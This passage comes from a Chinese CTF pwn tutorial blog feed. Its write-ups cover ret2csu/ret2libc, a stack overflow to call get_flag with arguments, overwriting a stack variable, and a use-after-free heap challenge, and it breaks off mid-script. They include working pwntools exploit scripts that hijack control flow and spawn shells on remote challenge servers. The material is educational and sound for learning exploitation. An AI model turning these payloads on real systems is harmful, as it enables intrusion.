edi, r12d</span><br><span class="line">.text:0000000000401299                 call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">.text:000000000040129D                 add     rbx, 1</span><br><span class="line">.text:00000000004012A1                 cmp     rbp, rbx</span><br><span class="line">.text:00000000004012A4                 jnz     short loc_401290</span><br><span class="line">.text:00000000004012A6</span><br><span class="line">.text:00000000004012A6 loc_4012A6:                             ; CODE XREF: __libc_csu_init+35↑j</span><br><span class="line">.text:00000000004012A6                 add     rsp, 8</span><br><span class="line">.text:00000000004012AA                 pop     rbx</span><br><span class="line">.text:00000000004012AB                 pop     rbp</span><br><span class="line">.text:00000000004012AC                 pop     r12</span><br><span class="line">.text:00000000004012AE                 pop     r13</span><br><span class="line">.text:00000000004012B0                 pop     r14</span><br><span class="line">.text:00000000004012B2                 pop     r15</span><br><span class="line">.text:00000000004012B4                 retn</span><br></pre></td></tr></table></figure><p>我们再看一下程序给了我们哪些函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006171623.png" title="QQ截图20221006171623" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20221006171623.png" alt="QQ截图20221006171623"></a></p><p>那么思路直接有了 这里用write函数 然后通过csu汇编代码将参数传给寄存器 这样我们就能泄露出write函数的真实地址了(也可以是其他的)</p><p>泄露出来以后 就是ret2libc的知识点了 思路捋清了 直接看exp吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;43.143.7.97&quot;</span>,<span class="number">28657</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./ret2csu&quot;</span>)</span><br><span class="line">gadget2_addr = <span class="number">0x4012A6</span></span><br><span class="line">gadget1_addr = <span class="number">0x401290</span></span><br><span class="line">vuln_addr = <span class="number">0x401176</span></span><br><span class="line">rdi_addr = <span class="number">0x4012b3</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">payload1 = cyclic(<span class="number">0x100</span>+<span class="number">0x8</span>)+p64(gadget2_addr)+cyclic(<span class="number">8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">1</span>)+p64(write_got)+p64(<span class="number">8</span>)+p64(write_got)+p64(gadget1_addr)+cyclic(<span class="number">56</span>)+p64(vuln_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Ok.\n&quot;</span>)</span><br><span class="line">write_addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">hex</span>(libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">hex</span>(system_addr)</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="built_in">hex</span>(binsh_addr)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">payload2 = cyclic(<span class="number">0x108</span>)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)+p64(vuln_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>栈溢出-特殊情况</title>
      <link href="/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/"/>
      <url>/2022/10/03/%E6%A0%88%E6%BA%A2%E5%87%BA-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>本篇博客用来记录一种特殊的情况</p><p>直接上例题吧 看完就知道什么意思了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  gets(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">get_flag</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// al</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">814536271</span> &amp;&amp; a2 == <span class="number">425138641</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    v3 = getc(v2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 != <span class="number">255</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = (<span class="type">char</span>)v3;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(v4);</span><br><span class="line">        v5 = getc(v2);</span><br><span class="line">        v4 = (<span class="type">char</span>)v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v5 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总体的思路应该就是最简单的栈溢出控制程序执行流到getflag这个函数</p><p>但是getflag在open flag.txt前有一个if判定 我们要先使a1 a2的值符合这个条件 才能使函数正常运行</p><p>但是这个a1 a2我们发现也没有办法通过栈溢出的方法来覆盖使其变成符合条件的值</p><p>所以这里只能在调用getflag函数时 一并传入a1 a2的值</p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29661</span>)</span><br><span class="line">getflag_addr = <span class="number">0x80489a0</span></span><br><span class="line">exit_addr = <span class="number">0x804e6a0</span></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p32(getflag_addr)+p32(exit_addr)+p32(<span class="number">0x308CD64F</span>)+p32(<span class="number">0x195719D1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>这里你会发现 按照平常我们填充的垃圾数据应该是 变量到ebp的距离0x38+0x4来覆盖ebp</p><p>这里为什么我们没有多一个字长的垃圾数据呢？</p><p>来看一下main函数的汇编情况</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022255710.png" title="1" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022255710.png" alt="1"></a></p><p>是不是缺少了什么？ 如果你对栈帧的概念不是很清楚 可能看不出什么 我们再放一段正常的函数汇编代码</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022255948.png" title="2" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022255948.png" alt="2"></a></p><p>如果你熟悉栈帧的概念(这个我们在ret2csu里有讲到) 你就会知道大部分栈帧在生成的时候都会有这两段汇编代码 用来使esp和ebp入栈</p><p>但是这道题的getflag函数并没有ebp 他利用esp寻址的办法</p><p>所以此时我们的变量距离ret addr只有0x38字节 而非0x38+4</p><p>再说回为什么函数和参数之间的垃圾数据要为exit函数的地址</p><p>这是因为程序如果是以异常状况结束的 那么他将不会有回显 也就是说open(flag)得到的flag并不会显示出来</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>溢出覆盖变量</title>
      <link href="/2022/10/03/%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F/"/>
      <url>/2022/10/03/%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96%E5%8F%98%E9%87%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>其实这个知识点应该算是栈溢出后面就可以讲的了 顺序没把握好 不过还好这篇的例题有点干货 就不丢到基础知识扩展那个专题了 在这面说吧</p><p>我们已经学习了基础的栈溢出对吧 总归就是覆盖栈上的高地址内的数据 通常我们都是用一些没有意义的垃圾数据去覆盖他</p><p>但是有些题目 就可能会故意刁难我们</p><p>比如下面这题</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022255328.png" title="1" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303022255328.png" alt="1"></a></p><p>是吧 他都把var[13]赋值为了0 结果要var[13]&gt;0并且&#x3D;17才能达到我们系统调用的目的</p><p>这怎么整？</p><p>我们唯一的输入点就在第十行 其中肯定有漏洞</p><p>%s 读入字符串数据 注意这里的是%s 我们刚开始提到的干货就是这个</p><p><strong>ps:这里我也理解不了 感兴趣的可以自己看大佬博客：</strong></p><p><strong><a href="https://www.cnblogs.com/lovezxy520/p/15892011.html">pwn中str()与p64() - ATKevin - 博客园 (cnblogs.com)</a></strong></p><p><strong>不然就是记个结论 %s就得用p32&#x2F;p64 传输数据</strong></p><p>也就是说我们在覆盖var[13]时 需要注意不能用b””或者是str()</p><p>说回题目</p><p>scanf没有对输入的字节长度进行限制 存在了栈溢出漏洞</p><p>我们只需要用垃圾数据填充var数组的前13个数据 然后用17填充var[13]</p><p>当然 这里还得注意一下</p><p>char类型的数组的每个值都是一个字节长度的 而这题并不是char类型的数组  所以我们应该用一个字长去覆盖一个数组元素</p><p>所以这里我们的payload应该写成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = cyclic(13*4)+p32(17)</span><br></pre></td></tr></table></figure><p>当然也可以写成</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p32(1)*13+p32(17)</span><br></pre></td></tr></table></figure><p>这样我们就成功覆盖了var[13]的值为17了</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> stack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>UAF</title>
      <link href="/2022/10/01/UAF/"/>
      <url>/2022/10/01/UAF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>TNND 说真的 堆开始的pwn就真的难度递增 网上的资料又少 又难理解 所以从UAF开始的各种堆利用手法 我都会倾尽自己全部的修辞能力和解释能力 尽可能让你理解的简单容易 因为我自己学的时候实在是太坐牢了</p><h2 id="UAF原理"><a href="#UAF原理" class="headerlink" title="UAF原理"></a>UAF原理</h2><p>先搞懂这个到底是什么意思吧 uaf 全程 use after free 很好理解的吧</p><p>就是当我们把一个chunk释放之后 再利用他</p><p>怎么做到这一点？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;cstdlib&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char *p1;</span><br><span class="line">    p1 = (char *) malloc(sizeof(char)*10);//申请内存空间</span><br><span class="line">    memcpy(p1,&quot;hello&quot;,10);</span><br><span class="line">    printf(&quot;p1 addr:%x,%s\n&quot;,p1,p1);</span><br><span class="line">    free(p1);//释放内存空间</span><br><span class="line">    char *p2;</span><br><span class="line">    p2 = (char *)malloc(sizeof(char)*10);//二次申请内存空间，与第一次大小相同，申请到了同一块内存</span><br><span class="line">    memcpy(p1,&quot;world&quot;,10);//对内存进行修改</span><br><span class="line">    printf(&quot;p2 addr:%x,%s\n&quot;,p2,p1);//验证</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>放一段代码 应该很好看懂吧</p><p>先申请一个chunk 然后打印出指向这个chunk的指针的值</p><p>再释放这个chunk 接着再申请一个</p><p>最后再打印出新申请的chunk的指针的值</p><p>我们会发现这二者都是一样的值</p><p>说明什么？</p><p><strong>如果只是单纯的free chunk的话 没有去清空指向被free的这个chunk的指针 那么这个指针仍然可以指向这个free chunk</strong></p><p>概念介绍到这边 应该就可以大部分理解了 如果你需要更加详细的介绍 可以看下面这篇文章</p><p><a href="https://blog.csdn.net/qq_31481187/article/details/73612451">(3条消息) UAF (Use After Free)漏洞分析及利用_4ct10n的博客-CSDN博客_uaf</a></p><h2 id="真题复现1"><a href="#真题复现1" class="headerlink" title="真题复现1"></a>真题复现1</h2><p>说真的 光uaf的题型就有好多种出法 想了想 还是拿nisa 21届校赛的题来当第一道例题 这道题的引导性个人认为十分不错 同时讲解起来也方便理解</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/1.png" title="1" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/1.png" alt="1"></a></p><p>checksec看一下保护机制和位数  发现是<strong>32位</strong>的  那么接下来的一些数据就得注意了</p><p>拖到ida里面看看main函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1.create&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;2.edit&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;3.delete&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;4.show&quot;</span>);</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">58</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">0</span>] != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3[<span class="number">0</span>] &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">0</span>] == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        del();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3[<span class="number">0</span>] == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        show();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3[<span class="number">0</span>] != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      create();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you are creating the %d page\n&quot;</span>, i);</span><br><span class="line">  result = i;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &lt;= <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v1 = i;</span><br><span class="line">      (&amp;page)[v1] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">      <span class="keyword">if</span> ( i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &lt;= <span class="number">0</span> || i &gt; <span class="number">9</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = <span class="built_in">puts</span>(<span class="string">&quot;NO PAGE&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Good cretation!&quot;</span>);</span><br><span class="line">          result = ++i;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v2 = page;</span><br><span class="line">        *page = <span class="number">1868654951</span>;</span><br><span class="line">        v2[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">        *(page + <span class="number">1</span>) = echo;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;The init page&quot;</span>);</span><br><span class="line">        result = ++i;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input page&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO PAGE&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input your strings&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, (&amp;page)[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input page&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; i )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;NO PAGE&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">free</span>((&amp;page)[v1]);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input page&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 &lt;= <span class="number">0</span> || v1 &gt; i )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;NO PAGE&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      echo((&amp;page)[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    (*(page + <span class="number">1</span>))(page);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看蒙蔽了是不是 没关系 接下来 我们将花费足够的时间以及耐心来为你分析透彻这些代码</p><p>目光聚集到main函数</p><p>堆的经典菜单题 看懂不成问题吧 输入对应的数字跳转进对应的函数</p><p>按照顺序我们先看create函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/2.png" title="2" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/2.png" alt="2"></a></p><p>第一遍我们先粗略的遍历一遍这个函数的作用</p><p>有一点小不同 其他题目可能还需要我们输入index来创建一个chunk 但是这题是用++i的办法来自己设置index</p><p>可以看到创建的chunk大小固定为0x8</p><p>接着看第二个箭头指向的代码</p><p>*()就是指这个地址的内容</p><p>假设哈 假设page &#x3D; 0x1000</p><p>你可能以为page+1的结果会是0x1001</p><p>其实不是 这里的1是指一个字长 也就是说结果其实是0x1004</p><p>那么这段代码的意思也就是说</p><p>page地址的下一个字长的内容更改为echo这个函数</p><p>然后我们点进去看一下这个函数是干什么的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">echo</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>puts 有点东西是不是 不过我们先放着 再看一下edit函数</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/3.png" title="3" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/3.png" alt="3"></a></p><p>这个函数内容不用说看名字也懂干什么的吧  就是输入你要编辑的index数 然后再输入要更改的内容</p><p>这里用到了scanf 这个函数没有限制输入字长 我们栈溢出的常客是不是</p><p>所以这里也能来个溢出？ 对了 有这个想法 这题你能看到曙光了</p><p>我们再回想一下 上一个函数create 指针所指向的下一个字长处是不是一个echo函数</p><p>欸 是吧 替换addr来控制程序执行流我们再熟悉不过了</p><p>不过先别激动 还有一个函数没看呢(delete我也解释不来 你就知道他free了chunk但是没有清空指针的内容就行了)</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/4.png" title="4" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/4.png" alt="4"></a></p><p>看到那个if判定了吗 如果我们只设置一个chunk 那么我们想要show这个chunk还不行 因为index不能为0</p><p>所以我说这道题的引导性其实是很好的  他驱使你去进行uaf </p><p>所以我们的思路是什么</p><p>先创建一个page0的chunk 然后把他free了</p><p>接着创建一个page1的chunk 由于page0被释放后会被存入fast bin</p><p>此时申请的page1大小小于等于page0 所以page0就被重新分配给了page1</p><p>他们两个共享一个空间 指针指向的地址相同 这里就利用了uaf</p><p>那么我们之前看到的edit函数又该如何利用呢？再接着看show函数图上的第二个箭头</p><p>这句代码的作用是什么？</p><p>先执行指针所指向的地址的下一个字长的指令 接着用指针所指向的地址的内容当作先前执行的指令的参数</p><p>看到这里你就能懂了吧 所以当我们不对chunk内容进行任何溢出时 当我们仅仅只是输入小于一个字长的数据时</p><p>show函数就相当于调用了echo函数把chunk的内容puts了出来</p><p>所以此时我们的思路就立马清晰了</p><p>我们用edit函数修改chunk的内容为  <strong>“sh\x00\x00”</strong></p><p>然后溢出到下一个字长 修改其内容为system的地址</p><p>这样当我们执行show函数的时候 其就会使用chunk内的sh当作system函数的参数</p><p>因此我们成功实现了系统调用</p><p>这里再解释一下为什么是 sh\x00\x00 因为是32位的程序嘛</p><p>一个字长只有4个字节 如果我们使用的是&#x2F;bin&#x2F;sh显然字节不够</p><p>所以使用sh也能达成对应的操作 至于后面的两个\x00 显然是为了填充字节 又不至于破坏sh字符串</p><p>所以最后我们的exp是：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28340</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input page\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input your strings\n&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Input page\n&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span 